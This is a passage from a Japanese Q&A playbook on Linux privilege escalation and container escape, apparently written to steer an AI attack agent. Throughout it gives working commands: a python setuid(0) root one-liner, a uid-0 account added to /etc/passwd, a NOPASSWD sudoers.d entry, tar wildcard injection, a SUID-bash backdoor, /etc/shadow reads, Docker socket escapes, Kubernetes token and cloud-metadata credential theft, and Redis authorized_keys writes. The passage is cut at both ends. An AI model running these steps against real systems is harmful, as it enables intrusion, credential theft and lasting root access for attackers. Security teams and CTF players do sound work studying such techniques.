**A4**: perl/python CGI にコマンド注入のパラメータや環境変数があるかを見る。CGI という古いアーキテクチャには歴史上、多くのパラメータ注入事例がある。先に URL パラメータ、Cookie、UA を 1 つずつ試す。
**Q5**: shellshock/CGI が全て無理な場合、遮断されてどこへ方向転換するか?
**A5**: 通常の web 脆弱性のディメンションに方向転換する。CGI アプリは古いことが多く、SQLi/ファイルインクルード/逆シリアル化の面がより大きい。CGI は「この対象は非常に古い」というサインであり、サイト全体のアプリケーション層脆弱性をスキャンする方が見返りが高い。
**Q6**: 通ったが、落ちた shell に tty がない場合、どう引き継ぐか?
**A6**: tty 昇格連鎖を参照する。CGI リバースの shell は生まれつき tty がないので、即座に python -c pty.spawn か script /dev/null で pty を起動する。そうしないと sudo/su が使えない。

### rbash / lshell 系の制限付き shell エスケープ
**Q1**: SSH や su で入ったら rbash(制限版 bash)で、多くのコマンドが使えない。どうエスケープするか?
**A1**: 先に制限の種別を把握する。rbash の一般的な制限:cd できない、PATH を変更できない、リダイレクトできない、`/` 付きのコマンドを実行できない。`echo *`、`compgen -c` で使えるコマンドを列挙し、`which -a` で探索する。判定基準:実行できて子 shell を起動できるコマンドを 1 つ見つければ十分である。
**Q2**: vi/vim が使える場合、どうエスケープするか?
**A2**: 定番の `:set shell=/bin/sh` してから `:shell`、または `:!sh`。vi が起動する子 shell は rbash の制限を継承しない。同種の less/more では `!sh` を入力する。GTFObins に完全なリストがある。
**Q3**: ホワイトリストのコマンドが数個だけで、vi/less/find/awk のような「多才な」ものがない場合はどうするか?
**A3**: -exec や lua/python を内蔵するものを探す:tar --checkpoint-action、find -exec、awk BEGIN system()、python -c、perl -e、gdb、さらには nmap --interactive(旧バージョン)。子プロセス呼び出しやスクリプトロードを許可するものは全てエスケープできる。
**Q4**: ホワイトリストが厳しく利用できるコマンドがない場合はどうするか?
**A4**: SSH パラメータを攻める。再接続時に `ssh user@host -t 'bash --noprofile --norc'` を使うか、`-o ProxyCommand` などを使う。rbash は shell 起動後に制限するので、別の起動コマンドを指定して迂回できるかは sshd の ForceCommand 設定次第である。
**Q5**: ForceCommand でロックされ shell を替えられない場合、遮断されてどこへ方向転換するか?
**A5**: 「ファイル」のディメンションに方向転換する。SFTP が禁止されていなければ、ユーザーディレクトリを読み書きできるので、直接 `~/.bashrc`/`~/.profile`/`~/.ssh/rc` を変更する。次回ログイン時に通常の bash で実行される(一部の rbash 設定は次回も制限されるが、注入スクリプトは shell 起動前に 1 回走れば十分)。
**Q6**: SFTP も禁止され、全て封じられた場合はどうするか?
**A6**: このアカウントのディメンションが封じられたと認め、「このアカウントで何ができるか」に戻る。rbash は運用者がログ閲覧/特定レポート実行用の読み取り専用アカウントに与えることが多い。タスクがその種の情報で達成できるか考える。

### sudo -l に NOPASSWD 項目がある - GTFOBins の考え方
**Q1**: `sudo -l` を実行して NOPASSWD で許可されたコマンドがいくつか見えた。どれが権限昇格できるかをどう体系的に判断するか?
**A1**: 1 つずつ GTFOBins の頭の中の表に照らす(agent はこの表のパターンを内蔵すべき)。核心の問い:そのコマンドを誘導して、以下のどれかをさせられるか。子 shell を起動する、任意ファイルを root 権限で読む、任意ファイルを書く、任意の共有ライブラリをロードする。どれか 1 つに該当すれば権限昇格は可能である。
**Q2**: コマンドに GTFOBins の記録はあるが対話が必要(vim :shell など)で、SSH リバース shell に tty がない場合はどうするか?
**A2**: 先に tty を昇格する(python pty.spawn + stty raw + 手動で rows/cols を設定)。それから対話経路に進む。これは sudo 権限昇格のよくある落とし穴である。
**Q3**: コマンドがカスタムスクリプト(例 `/opt/tool/run.sh`)で、GTFOBins にない場合、どう分析するか?
**A3**: スクリプトを読む(root でしか読めないかもしれないので、先に権限を見る)。注入点を探す:shell を呼んでパラメータを連結しているか、書き込み可能なファイルを source しているか、PATH 制御可能なコマンドを exec しているか。それぞれが権限昇格のベクトルになる。
**Q4**: コマンドが安全に見える(例 sudo /bin/cat でファイル読み取りしか許可しない)場合、本当に手詰まりか?
**A4**: 手詰まりではない。/bin/cat を root で /etc/shadow に使って読み、オフラインで hash を破る。/bin/tar を root で任意ファイル読み取りに使うのも同様である。GTFOBins の「File read」カテゴリがこの用途で、shell を起動できなくても横展開できる。
**Q5**: コマンドにパラメータのホワイトリスト検証があり(-exec などを渡せない)、遮断されてどこへ方向転換するか?
**A5**: 検証自体を攻める。単純な `grep -v -e "危険パラメータ"` かどうかを見て、環境変数、エイリアス、スクリプト wrapper で迂回できるかを見る。または sudoers がワイルドカード(`sudo /bin/cmd *`)を使っているかを見る。ワイルドカードはパラメータを別のオプションに連結できることが多い。
**Q6**: 1 つの NOPASSWD も無理な場合、さらにどこへ方向転換するか?
**A6**: SUID/capabilities/cron/カーネル exp の直交経路に方向転換する。sudo は Linux 権限昇格の 1 本の線であり、唯一ではない。

### NOPASSWD コマンドが厳格だが引数を渡せる - 環境変数/引数注入
**Q1**: sudoers に `NOPASSWD: /usr/bin/prog arg1 arg2 *` があり、末尾のワイルドカードで引数を追加できる。どう利用するか?
**A1**: prog の引数解析を見る。`--config=/attacker.conf` や `-o loadmodule=/attacker.so` のようなオプションを追加して、解析されれば挙動を制御できる。または shell メタ文字を追加する。sudo 自体は shell を解析しないが、ワイルドカードが shell 展開で複数引数になり、意味が変わることがある。
**Q2**: sudoers が `env_keep+=` や `Defaults !env_reset` を使っている場合、環境変数で権限昇格できるか?
**A2**: できる。LD_PRELOAD/LD_LIBRARY_PATH/PYTHONPATH/PERL5LIB が env_keep に入っていれば、許可されたコマンドがこれらの言語を使う際に直接乗っ取れる。判定基準:`sudo -l` の出力の env セクションに keep 項目が見える。
**Q3**: コマンドが shell スクリプトで、相対パスで子コマンドを呼び、PATH が保持される場合はどうするか?
**A3**: PATH が env_keep に入っている(または secure_path が未設定)なら、同名の悪意あるコマンドを現在の PATH の前方ディレクトリに書き、root で実行させる。これは古くからある PATH ハイジャックである。
**Q4**: `secure_path` が設定済みで env_reset も厳しい場合はどうするか?
**A4**: ワイルドカードの引数注入に方向転換する。許可済みコマンドに `-i include`、`-e exec`、`-p pluginfile`、`--load` のような外部コードをロードできるオプションがあるか探す。GTFOBins では、書き込み可能なスクリプト言語のインタープリタのほぼ全てにある。
**Q5**: コマンド引数検証+env_reset+secure_path の三重に厳しい場合、遮断されてどこへ方向転換するか?
**A5**: 「コマンド自体の脆弱性」に方向転換する。カスタムの setuid/sudo 許可バイナリなら、バイナリとして分析する(strings、objdump)。スタックオーバーフロー、コマンド連結、競合状態を探す。または sudo を完全に諦めて SUID/cap/カーネルに進む。
**Q6**: 対象マシンが外部への payload ダウンロードを禁止している場合はどうするか?
**A6**: base64 の payload を sudo の引数に直接インラインで埋めるか、`bash -c "$(echo B64|base64 -d)"` を使う。sudo で実行が許可された shell 内では何でもできるので、ダウンロードは不要である。

### SUID バイナリの調査と優先順位
**Q1**: www-data を得て、本機の SUID root バイナリを探したい。どう調査するか?
**A1**: `find / -perm -4000 -type f 2>/dev/null` を一気に実行し、システム標準の SUID(passwd/su/sudo/mount などの通常のもの)をフィルタする。残った非標準のものが重点である。判定基準:名前が見覚えなく、パスが /opt/、/usr/local/ にあるものが最も疑わしい。
**Q2**: 見つかった SUID が標準ツール(例 find、cp、tar、python)の場合、どうするか?
**A2**: GTFOBins の SUID カテゴリが直接該当する。find -exec、cp による機微ファイル上書き、tar --checkpoint、python 権限昇格、いずれもワンライナーで済む。
**Q3**: カスタム SUID バイナリを 1 つ見つけた場合、どう分析するか?
**A3**: 3 ステップである:(1) `strings` でハードコードされたパス、system()、popen() がないか探す。(2) `ltrace` で動的にどのライブラリ関数を呼ぶか、getenv/execvp があるかを見る。(3) 直接 `checksec`+objdump で逆アセンブルし、スタックオーバーフロー/書式文字列を探す。コマンド連結と PATH ハイジャックが最も一般的な勝ち筋である。
**Q4**: カスタム SUID が絶対パスを使い厳密にエスケープしており、古い手が効かない場合はどうするか?
**A4**: 「LD_PRELOAD 関連」に方向転換する。setuid バイナリは標準では LD_PRELOAD を拒否するが、バイナリに RUNPATH がなく非システムディレクトリの so をロードするなら、悪意ある同名 so を検索パスに書き込んで権限昇格できる。または CVE レベルの glibc 脆弱性を使う。
**Q5**: SUID が全て標準でシステムもパッチ済みの場合、遮断されてどこへ方向転換するか?
**A5**: capabilities のディメンションに方向転換する。`getcap -r / 2>/dev/null` で cap_setuid/cap_dac_read_search/cap_sys_admin を持つバイナリを探す。同様に権限昇格でき、考え方は SUID と似ているが、管理者に見落とされやすい。
**Q6**: SUID を見つけたが所有者が root でない(例 別ユーザー)場合はどうするか?
**A6**: 依然として役に立つ。そのユーザーへ横展開し、そのユーザーの sudo -l/history/鍵を見る。ペネトレーションが一歩で root になることは稀で、層ごとの横展開が常態である。

### Linux capabilities 権限昇格の判定
**Q1**: `getcap -r / 2>/dev/null` でいくつかの非標準バイナリに cap があるのを見た。優先順位をどう判定するか?
**A1**: 能力の危険度で並べる:`cap_setuid`(直接 uid=0 に切替)> `cap_dac_read_search`(任意ファイル読み取り)> `cap_dac_override`(任意ファイル読み書き)> `cap_sys_admin`(ほぼ何でもできる)> `cap_sys_ptrace`(他プロセスへの注入)> `cap_net_admin`/`cap_net_raw`(ネットワーク級)。前の 3 つは一歩で root か同等の効果に直結する。
**Q2**: python/perl/ruby が cap_setuid+ep を持つ場合、どう使うか?
**A2**: ワンライナーである:`python -c 'import os; os.setuid(0); os.system("/bin/sh")'`。cap_setuid+ep は「使えて、かつ既定で継承される」を意味し、直接 setuid(0) すれば root に切替わる。
**Q3**: cap を持つバイナリがスクリプトインタープリタではなく業務プログラムの場合、どうするか?
**A3**: SUID 分析と同様である。コマンド連結、PATH 依存、ライブラリ依存のハイジャックを探す。cap バイナリは setuid と完全には同じでないが、LD_PRELOAD へのフィルタ規則が異なる可能性がある(カーネルと secure-execution 判定次第)。試す価値がある。
**Q4**: cap_dac_read_search しかなく shell を起動できない場合、どう使うか?
**A4**: `/etc/shadow` を読んでオフラインで root hash を破るか、root ユーザーの `~/.ssh/id_rsa` を読む。cap_dac_read_search は DAC の読み取り権限を迂回するのに等しく、認証情報を得て横展開する。
**Q5**: システム上で getcap の出力が空( libcap-bin が入っていない、または本当にない)の場合、遮断されてどこへ方向転換するか?
**A5**: 手動で `/proc/*/status` を読み、cap を持つプロセスがないかを見る(CapEff/CapPrm フィールドが全ゼロでない)。起動中のプロセスから逆推定する。または SUID/cron/カーネル exp の直交経路に方向転換する。
**Q6**: cap はあるがカーネルが新しく、cap 使用が seccomp/apparmor に遮られる場合はどうするか?
**A6**: 単一ホップの権限昇格ができないと認め、「cap で低価値の副産物を得る」ことに方向転換する。例 cap_net_admin で tun トンネルを起動してトラフィックをプロキシする。root まで行かなくても足場の能力は拡張できる。

### cron/systemd timer 権限昇格の切り込み点
**Q1**: `crontab -l`、`cat /etc/crontab`、`ls /etc/cron.*/`、`systemctl list-timers` で root のスケジュールタスクが見えた。注入点をどう探すか?
**A1**: 目標は「root タスク内で現在のユーザーが書き込めるものを呼んでいる」箇所を見つけることである。(1) タスクスクリプト自体が書き込み可能か。(2) スクリプトが source/include する子ファイルが書き込み可能か。(3) タスクが相対パスのコマンドを呼び、PATH の接頭辞に書き込み可能なディレクトリがあるか。(4) タスクが tar/rsync/find で現在のユーザーが書き込めるディレクトリを走査し、マッチしたファイルに操作を行うか、を確認する。
**Q2**: タスクスクリプト自体が root:root 644 で、直接の注入点がない場合はどうするか?
**A2**: その内部ロジックを読む。よくある落とし穴:/tmp の一時ファイルを使う、pip パッケージのパスが書き込み可能に依存する、stdout を書き込み可能なログにリダイレクトする(log rotation の create/su 項目と組み合わせる)。
**Q3**: タスクの実行頻度が非常に低い(毎日/毎週)場合、どう検証を加速するか?
**A3**: 待たない。strace/inotify-tools で関連ファイルへのアクセスを監視してタスクが既に走ったかを観察するか、ログ(/var/log/syslog、systemd journal)を読んで前回の実行時刻と出力を探す。規則性を見つけてから注入方式を決める。
**Q4**: 注入点を見つけたが root ディレクトリの書き込み権限が必要(例 /root/backup/)な場合はどうするか?
**A4**: ワイルドカード権限昇格を探す。cron に `tar czf backup.tar.gz *` や rsync などがあり、`*` が書き込み可能なディレクトリで展開されるなら、`--checkpoint-action=exec=/tmp/x.sh` という名前の空ファイルを書く。tar がそれを引数として解析する。定番のワイルドカード注入である。
**Q5**: システム上で root のスケジュールタスクが全く見つからない場合、遮断されてどこへ方向転換するか?
**A5**: 「サービス/プロセス」のディメンションに方向転換する。`ps -ef` で root デーモンを探し、同様に書き込み可能なスクリプト/設定/socket の注入経路を探す。または `find / -writable -type d 2>/dev/null` で現在のユーザーが書き込める全ディレクトリを探し、root サービスが使うものを逆推定する。
**Q6**: 注入点を見つけたが、トリガー後ずっと効かない場合はどうするか?
**A6**: cron 環境を確認する。cron の PATH/HOME/USER は簡素な環境で、スクリプトが想定する環境変数がないと起動できないことがある。/var/spool/mail/root や syslog の cron エラー出力を読んで特定する。

### Linux カーネル exp の選定と対象破壊リスク
**Q1**: 前の経路が全て塞がり、カーネル exp に踏み切ることにした。どう選ぶか?
**A1**: `uname -a` でカーネルバージョン、`cat /etc/os-release` でディストリビューション、`arch` でアーキテクチャを得る。既知の exp と照合する:先にディストリビューションにパッチの backport があるかを見る(RHEL/Ubuntu はバージョン番号を変えずに戻すことが多い)。その上で最も安定したものを選ぶ(Dirty COW、Dirty Pipe、pwnkit ファミリー、OverlayFS ファミリーなど)。判定基準:ディストリビューション+バージョン+アーキテクチャの 3 つが揃ってから撃つ。
**Q2**: 候補の exp が複数ある場合、先にどれを撃つか?
**A2**: 安定性を優先する。ユーザーモード exp(pwnkit、Dirty Pipe、sudo baron samedit)はカーネルモード exp よりはるかに安全で、対象を破壊しない。本当にカーネル exp に進むなら、公開 PoC が成熟していてテスト報告が多いものを選ぶ。
**Q3**: pwnkit(polkit)はほぼ全ての主要ディストリビューションで該当した。どう素早く攻撃可能か判定するか?
**A3**: `/usr/bin/pkexec` が存在し、かつ SUID か(`ls -l`)を確認する。バージョンが未修正ならほぼ確実に当たる。polkit >= 0.120 が入っていれば通常は修正済みである。判定基準:pkexec が存在 + 未パッチ + コンパイラがあるか、プリコンパイル済みバイナリをアップロードできること。
**Q4**: コンパイラがない場合はどうするか?
**A4**: 攻撃マシンで対象アーキテクチャ+libc バージョンに合わせてプリコンパイルしたバイナリを /tmp にアップロードして実行する。ディストリビューションが musl(Alpine)なら musl でコンパイルする。
**Q5**: カーネル exp が対象をクラッシュさせた場合はどうするか?
**A5**: 最悪の結果を受け入れる。認可されたペネトレーションなら、事前に顧客と「破壊通知のウィンドウ」を約束しておく。CTF ではカーネル exp の失敗は通常、現在の shell が死ぬだけで、再接続すればよい。判定基準:破壊前に自分の逃げ道を用意しておく(予備 shell か永続化)。
**Q6**: 全てのカーネル exp が適用不能(パッチ済み、KASLR、SMEP/SMAP)の場合、遮断されてどこへ方向転換するか?
**A6**: root が取れないと認め、「現在の権限の最大化利用」に戻る。他のアカウントへ横展開する、読めるものを読む、内部ネットワーク側へ拡張する。root は唯一の目標ではない。

### Docker コンテナエスケープ判定連鎖
**Q1**: shell を得た後、コンテナ内にいるのではと疑う。どう判定するか?
**A1**: 4 つのシグナルである:(1) `/.dockerenv` または `/run/.containerenv` が存在する。(2) `cat /proc/1/cgroup` に docker/kubepods/containerd が現れる。(3) `hostname` が短い hex か pod 風である。(4) プロセスツリーの PID 1 が systemd/init ではなくアプリケーションプロセスである。どれか 1 つに該当すればコンテナである。
**Q2**: コンテナと判定した後、先に何を調べるか?
**A2**: 「コンテナがどれだけ特権か」を調べる。`capsh --print` で cap リストを見る。`ls -la /dev/` で host disk デバイス(/dev/sda など)がマップされているか見る。`mount` で機微なディレクトリがマウントされているか見る(/、/var/run/docker.sock、/proc、/root)。`cat /proc/self/status | grep Cap` で CapEff を見る。判定基準:1 項目でも異常があれば見込みがある。
**Q3**: docker.sock がマウントされている場合、どうエスケープするか?
**A3**: `curl --unix-socket /var/run/docker.sock http://x/containers/create` で、privileged + ホスト root fs マウントのコンテナを起動する。中に入ればホストの root である。docker.sock は docker daemon の完全な権限に等しい。
**Q4**: privileged コンテナ(cap が全て与えられている)の場合、どうエスケープするか?
**A4**: 定番の cgroup notify_on_release トリックを使う:cgroup をマウントし、release_agent にホストで実行できるスクリプトを書き、release をトリガーするとホストの root で実行される。またはホストディスクを直接マウントして chroot する。判定基準:CapEff が ffffffffff の全権なら必ず可能である。
**Q5**: 非特権でマウントもなく cap も削られた普通のコンテナで、エスケープできない場合(遮断されて方向転換)はどうするか?
**A5**: エスケープができないと認め、「横展開」に方向転換する。コンテナオーケストレーション内の同一 pod/名前空間の他のコンテナ、Service IP、クラスタ内部 API。またはコンテナネットワークから逆方向 SSRF でホスト上の他のサービスを攻める。エスケープだけが唯一の収益ではなく、横展開の方が価値が高いことが多い。
**Q6**: host PID 名前空間共有はあるが他の特権がない場合、エスケープできるか?
**A6**: できる。`nsenter -t 1 -m -u -i -n -p bash`(対応する cap があれば)で host namespaces に入る。または host PID 1 プロセスを攻めてそのメモリ/環境変数を読み、認証情報を得る。これは不完全だが依然として強力な越境である。

### Kubernetes pod 内の横展開の意思決定
**Q1**: K8s pod 内と判定した(env に KUBERNETES_SERVICE_HOST がある)。最初に何をするか?
**A1**: ServiceAccount token を探す:`cat /var/run/secrets/kubernetes.io/serviceaccount/token`。token があれば API アクセス認証情報を 1 つ得たことになる。同じディレクトリで ca.crt と namespace を読む。判定基準:読めたら kubectl(または直接 curl)を API server に向けて権限を試す。
**Q2**: token を得た後、権限をどう素早く評価するか?
**A2**: `curl -k -H "Authorization: Bearer $TOKEN" https://KUBE/api/v1/namespaces/$NS/pods` で pod 列挙を試す。または kubectl が使えるなら `kubectl auth can-i --list` が一目で分かる。判定基準:pods/secrets/deployments を list できれば横展開面が多くある。
**Q3**: 権限が非常に弱い(自分の pod の get しかできない)場合はどうするか?
**A3**: secrets にアクセスできるかを見る(DB 認証情報/クラウド IAM key/webhook token がよくある)、または他の pod への exec/portforward ができるかを見る。どちらも無ければ「環境変数+マウントボリュームを読む」ことに退く。ConfigMap/Secret は直接マウントされていることが多く、読めば即得られる。
**Q4**: クラスタ API にネットワーク到達できない(NetworkPolicy 制限)場合はどうするか?
**A4**: 「クラウド metadata」のディメンションに方向転換する。169.254.169.254 でクラウド IAM ロールの一時認証情報を取る(EKS/GKE/AKS に変種あり)。クラウド SDK と組み合わせて S3/OSS/他のインスタンスへ横展開する。K8s 内の pod は広い IAM を持つことが多い。
**Q5**: metadata も遮断される(IMDSv2 強制 token やホップ数遮断)場合、遮断されてどこへ方向転換するか?
**A5**: 「クラスタ内部サービス」に方向転換する。pod ネットワーク内の他のサービスは無認証のことが多い(内部信頼モデル)。ClusterIP セグメントをスキャンして無認証のパネル/未認可 API を探す。横展開に admin は不要である。
**Q6**: 目標がクラスタ admin 取得で、既存 token の権限が低すぎる場合、他に手はあるか?
**A6**: CVE 面に行けるかを見る(kubelet 読み取り専用 10255、read/write 10250 未認可、etcd 未認可、API server ~/kube-controller-manager の境界 CVE)。または人的手段:pod 内に開発者が残した kubeconfig がないかを見る。

### writable な機微ファイルのどこから手を付けるか
**Q1**: 検知で `/etc/passwd` が書き込み可能(/etc/shadow、`sudoers`、`/etc/pam.d/*` も)と分かった。先にどれを動かすか?
**A1**: 優先順位:passwd(最も簡単)> sudoers(次に簡単、1 行で NOPASSWD 追加)> shadow(自分のアカウントを把握して hash を足す必要)> pam(認証迂回のため設定変更、複雑だが強力)。判定基準:変更量が最も小さいものを先にやる。
**Q2**: passwd が書き込み可能な場合、具体的にどう使うか?
**A2**: 1 行 `attacker:$1$known$hash:0:0:root:/root:/bin/bash` を追加する(パスワード hash は自作、uid=0)。または openssl passwd -1 で生成する。追加後、`su attacker` でパスワードを入れれば root である。判定基準:追加は既存アカウントに影響せず、副作用がほぼない。
**Q3**: shadow だけ書き込み可能で、passwd が読み取り専用の場合はどうするか?
**A4**: root 行のパスワード hash フィールドを既知 hash の加塩結果に変更し、`su root` で自分のパスワードを使ってログインする。リスク:root パスワード変更は監視アラートになる可能性がある。納品の緊急性を評価して決める。
**Q4**: sudoers が書き込み可能だが、構文を 1 つ間違えると全部無駄になる。最も安全な変更は?
**A4**: メインファイルを変更せず `sudoers.d/` に新規ファイルを追加する:`echo 'attacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/x`。構文ミスでもこのファイルだけが無駄になる。判定基準:「追加」を「変更」より優先する。
**Q5**: 全パスが読み取り専用で pam も読み取り専用の場合、遮断されてどこへ方向転換するか?
**A5**: 「サービス設定」のディメンションに方向転換する。root サービス(nginx/apache/mysql)の設定ファイルがグループ書き込み可能なことがよくある。設定を変更して実行を注入する(nginx に lua ブロック追加、apache に handler 追加、mysql の my.cnf で general_log を web ディレクトリに書いてログを shell 化)。
**Q6**: サービス設定も全て読み取り専用の場合、さらにどこを探すか?
**A6**: 「crontab ユーザーセクション」に方向転換する。/var/spool/cron/crontabs/ のあるファイルが他ユーザーグループ書き込み可能なら、変更して注入する。または /etc/cron.d/ が root 権限でもディレクトリが world-writable(稀だが設定ミスとして存在する)なら使う。書き込みは Linux 権限昇格で最も直接的な経路の 1 つであり、書き込み可能な対象を探すこと自体が本筋である。

### PATH ハイジャックと cron/SUID 場面の組み合わせ
**Q1**: root スクリプト(cron または SUID wrapper)がパスなしのコマンド(`ls`、`awk` など)を使っているのを見つけた。どうハイジャックするか?
**A1**: 前提はスクリプトの PATH 変数の接頭辞に現在のユーザーが書き込めるディレクトリがあることである。同名の悪意あるコマンドをそのディレクトリに構築すると、root 実行時に私のバージョンが優先して当たる。判定基準:先にスクリプトを読んでコマンドが相対パスであることを確認し、スクリプト実行時の PATH を判断する。
**Q2**: cron の既定 PATH が /usr/bin:/bin で、現在のユーザーにこれらのディレクトリの書き込み権限がない場合はどうするか?
**A2**: スクリプト自体が `PATH=/tmp:$PATH` としているか、PATH を含む設定を source しているかを見る。または `sudo -E` で呼び出し側の環境の PATH を保持しているかを見る(sudo でより多い)。cron 自身の PATH は厳格で、ハイジャックしにくい。
**Q3**: SUID バイナリが execvp でパスなしのコマンドを呼んでいる場合、どう攻めるか?
**A3**: SUID 環境では glibc が一部の環境変数を sanitize するが PATH は消さない。悪意あるコマンドをあるディレクトリに書いた後、`PATH=そのディレクトリ /suid_binary` で直接実行する。SUID が PATH を保持すれば悪意あるコマンドに当たる。判定基準:strace を 1 回走らせて何を呼ぶか見る。
**Q4**: コマンドが絶対パスで PATH 依存がない場合、ライブラリをハイジャックできるか?
**A4**: SUID は LD_PRELOAD を受け付けないが、LD_AUDIT は受け付けないこともある。RPATH/RUNPATH が相対パスなら受け付ける。またはコマンドが依存する設定ファイルを攻める(書ければ)。
**Q5**: 上記全てが無理な場合、遮断されてどこへ方向転換するか?
**A5**: 「スクリプトファイルの競合」に方向転換する。root cron が定期的に `cp /home/*/report.log /var/root/` するなら、時間窓内に同名のシンボリックリンクを別の場所に向けて作るか、TOCTOU でファイル内容を改ざんする。競合窓は小さいが実行可能である。
**Q6**: 対象が外部ツールでの payload ダウンロードを禁止している場合はどうするか?
**A6**: 悪意あるコマンドは shell スクリプトでよい(コンパイル不要)。内容は 1 行で、`chmod u+s /bin/bash` または `cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash`。root で実行後、SUID bash が残るので、いつでも `/tmp/rootbash -p` で root になる。

### MySQL UDF 権限昇格の判定
**Q1**: 本機の MySQL root パスワードまたは socket 直結権限を得た。UDF 権限昇格をしたいが、判定基準は何か?
**A1**: 3 条件である:(1) MySQL が root または高権限ユーザーで動いている(多い)。(2) `secure_file_priv` が空か plugin_dir の書き込み可能なディレクトリを指している。(3) plugin_dir パスが既知(`show variables like 'plugin_dir'`)で書き込み可能である。判定基準:3 つが揃えば UDF に進む。
**Q2**: secure_file_priv に値があり、plugin_dir に書き込めない場合はどうするか?
**A2**: 高バージョンの MySQL は既定で secure_file_priv に値がある(/var/lib/mysql-files/)ため、plugin dir に書けない。別の経路に方向転換する:mysql の general_log を有効にしてログを web ディレクトリに書き、select 文と組み合わせて PHP shell を書く。
**Q3**: バージョンは UDF 可能だが udf.so ファイルがなく、外部ダウンロードもできない場合はどうするか?
**A3**: udf バイナリは小さいので、base64 エンコードして SQL insert で blob テーブルに入れ、select ... into dumpfile で plugin_dir に書く。完全オフラインである。判定基準:hex/base64 アップロード経路は SQL 層に内蔵された能力で、ほぼネットワーク制限を受けない。
**Q4**: create function が「シンボルが見つからない」エラーを返す場合はどうするか?
**A4**: UDF so のシンボルエクスポートは MySQL バージョンと一致する必要がある。sqlmap 内蔵または mysqludf-sys プロジェクトの、MySQL メジャーバージョンに対応する so を使う。バージョンが珍しければ自分で gcc コンパイルする。
**Q5**: UDF が全て失敗し、secure_file_priv がデッドロックの場合、遮断されてどこへ方向転換するか?
**A5**: 「MySQL でデータを取る」ことに方向転換する。UDF は権限昇格のためで、データ取得は SELECT INTO や直接 mysqldump で十分である。目標がデータで root でないなら、UDF は不要である。
**Q6**: MySQL サービスが root で動いておらず、UDF で mysql ユーザーしか取れない場合、まだ価値はあるか?
**A6**: ある。mysql ユーザーは全ての web アプリの config を読めることが多く、他のユーザーのアップロードディレクトリにアクセスできるので、横展開を続けられる。UDF で得られるのは root でなくても足場の昇格である。

### Redis 未認可のローカルファイル書き込み権限昇格経路
**Q1**: 本機の Redis が未認可で、それを使って root まで権限昇格したい。何ができるか?
**A1**: Redis がどのユーザーで動くかを見る:root なら `authorized_keys` を /root/.ssh/ に書く、crontab を /etc/cron.d/ に書く。非 root(redis ユーザーが一般的)なら redis ユーザーが書き込めるディレクトリに書いて横展開する。判定基準:redis プロセスの uid が書き込み先を決める。
**Q2**: authorized_keys を具体的にどう書くか?
**A2**: `CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET x "\n\nssh-rsa AAAA...\n\n"; SAVE`。SAVE が RDB をディスクに落とし、内容に公開鍵が含まれる。SSH が受け付ける(RDB ヘッダによる key 行の汚染を避けるため前後に改行を入れる)。
**Q3**: 対象の /root/.ssh が存在しない場合はどうするか?
**A3**: 先に root が SSH ログインを許可しているか見る(/etc/ssh/sshd_config の PermitRootLogin)。許可していなければ対象を替える。/home/xxx/.ssh/authorized_keys に書く(存在する一般ユーザー名を知る必要がある)。または cron.d を書いてコマンドをトリガーする。
**Q4**: 主従レプリケーション RCE の経路はいつ使うか?
**A4**: 4.x+ の slaveof 主従同期で module をロードして RCE できる。ファイル書き込み経路が失敗したとき(dir が書き込み不可、SSH が通らない)、主従モジュールロードに方向転換する:偽の master を自分で立て、対象が私から module を引き取ってロードする。判定基準:対象 Redis バージョンが 4.x-6.x で、module ロードが禁止されていないこと。
**Q5**: 未認可だが Redis が低権限でサンドボックスも厳しい場合、遮断されてどこへ方向転換するか?
**A5**: 「認証情報を読む」ことに方向転換する。Redis は session、キャッシュ、token を保存することが多いので、`KEYS *` で一気に取る。権限昇格できなくても、アプリ session や admin token を得れば大きな収益になる。
**Q6**: ネットワーク上の対象 Redis が unix socket しかリッスンしていない場合、接続できるか?
**A6**: できる。shell を得た後 `redis-cli -s /path/to/redis.sock`、または nc -U を使う。unix socket のローカル権限が誰が接続できるかを決めるので、socket ファイルの読み書き権限があればよい。

### Python jail / 制限付き eval エスケープ
**Q1**: Python の制限付き eval サンドボックスを得た(import、__import__、compile などをフィルタ)。どうエスケープするか?
**A1**: 目標は任意オブジェクトの `__class__`.__mro__[-1] すなわち object を取得し、__subclasses__() を走査して危険なクラスを探すことである。定番は `subprocess.Popen`、`os._wrap_close`、`warnings.catch_warnings` など。判定基準:コマンドを間接的に exec できるサブクラスを 1 つ見つければ勝ちである。
**Q2**: `.` もフィルタされる場合はどうするか?
**A2**: `getattr` で代替するか、文字列連結で迂回する。`getattr(obj, "__class__")` は obj.__class__ と等価であり、`chr(x)+chr(y)` で文字列を組み立てて getattr する。判定基準:フィルタが文字を検査しても関数呼び出しの引数を検査しなければ迂回できる。
**Q3**: キーワードが全てフィルタされる(class、mro、subclasses の文字列が出せない)場合はどうするか?
**A3**: f-string、`{}.format`、または `+` で文字列を組み立てる。または dict インデックス `__builtins__["ex"+"ec"]` を使う。これらはコンパイル時にキーワードを含まないランタイム構築である。
**Q4**: __builtins__ が空にされた場合はどうするか?
**A4**: frame オブジェクトから行く。`(lambda: 0).__globals__` または `(lambda: 0).__code__` で逆方向に frame を取り、frame から builtins を得る。または generator/coroutine の `gi_frame`/`cr_frame` を利用する。
**Q5**: サンドボックスが RestrictedPython や pyodide 系の本当のバイトコード級制限で、逃げられない場合(遮断されて方向転換)はどうするか?
**A5**: 「サンドボックス環境側」に方向転換する。サンドボックス自体が何らかのプロセスで動くので、サンドボックスが許可する機能(ネットワークリクエスト、ファイル読み取り)を利用して外部脆弱性をトリガーするか、偵察すればよい。必ずしも Python 内で RCE する必要はない。
**Q6**: 対象の Python バージョンが新しく(3.11+)、audit hooks が exec/system を遮る場合はどうするか?
**A6**: audit hook は機微な操作を記録し拒否できる。audit を迂回するには C 拡張から(ctypes で直接 syscall)行く必要があるが、制限付きサンドボックスは通常 ctypes を与えない。無理に迂回できないと認め、サンドボックス外側の攻撃面に方向転換する。

### shell を得たが tty がない - tty 昇格の意思決定
**Q1**: nc にリバースした shell に tty がなく、`sudo` が sorry, must have tty を返す。どう昇格するか?
**A1**: 第一選択は `python -c 'import pty;pty.spawn("/bin/bash")'`(python3 も同様)。次に `script -q /dev/null bash`。さらに `expect` や `socat`。判定基準:tty が 1 つあれば sudo/su/vim が全て使える。
**Q2**: python がなく、shell に script もない場合はどうするか?
